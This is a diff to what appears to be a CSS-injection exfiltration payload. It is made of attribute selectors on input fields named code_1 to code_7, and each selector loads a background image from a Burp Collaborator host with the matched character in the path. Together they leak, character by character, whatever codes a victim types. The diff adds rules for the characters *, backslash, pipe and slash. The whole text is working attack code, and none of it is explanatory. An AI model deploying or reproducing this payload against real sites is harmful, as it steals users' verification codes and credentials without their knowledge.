@@ -207,6 +207,18 @@ input[name=code_1][value=Y]{
 input[name=code_1][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_Z");
 }
+input[name=code_1][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_*");
+}
+input[name=code_1][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_\");
+}
+input[name=code_1][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_|");
+}
+input[name=code_1][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode1_/");
+}
 input[name=code_2][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_a");
 }
@@ -401,6 +413,18 @@ input[name=code_2][value=Y]{
 }
 input[name=code_2][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_Z");
+}
+input[name=code_2][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_*");
+}
+input[name=code_2][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_\");
+}
+input[name=code_2][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_|");
+}
+input[name=code_2][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode2_/");
 }
 input[name=code_3][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_a");
@@ -597,6 +621,18 @@ input[name=code_3][value=Y]{
 input[name=code_3][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_Z");
 }
+input[name=code_3][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_*");
+}
+input[name=code_3][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_\");
+}
+input[name=code_3][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_|");
+}
+input[name=code_3][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode3_/");
+}
 input[name=code_4][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_a");
 }
@@ -791,6 +827,18 @@ input[name=code_4][value=Y]{
 }
 input[name=code_4][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_Z");
+}
+input[name=code_4][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_*");
+}
+input[name=code_4][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_\");
+}
+input[name=code_4][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_|");
+}
+input[name=code_4][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode4_/");
 }
 input[name=code_5][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_a");
@@ -987,6 +1035,18 @@ input[name=code_5][value=Y]{
 input[name=code_5][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_Z");
 }
+input[name=code_5][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_*");
+}
+input[name=code_5][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_\");
+}
+input[name=code_5][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_|");
+}
+input[name=code_5][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode5_/");
+}
 input[name=code_6][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_a");
 }
@@ -1182,6 +1242,18 @@ input[name=code_6][value=Y]{
 input[name=code_6][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_Z");
 }
+input[name=code_6][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_*");
+}
+input[name=code_6][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_\");
+}
+input[name=code_6][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_|");
+}
+input[name=code_6][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode6_/");
+}
 input[name=code_7][value=a]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_a");
 }
@@ -1376,4 +1448,16 @@ input[name=code_7][value=Y]{
 }
 input[name=code_7][value=Z]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_Z");
+}
+input[name=code_7][value=*]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_*");
+}
+input[name=code_7][value=\]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_\");
+}
+input[name=code_7][value=|]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_|");
+}
+input[name=code_7][value=/]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode7_/");
 }
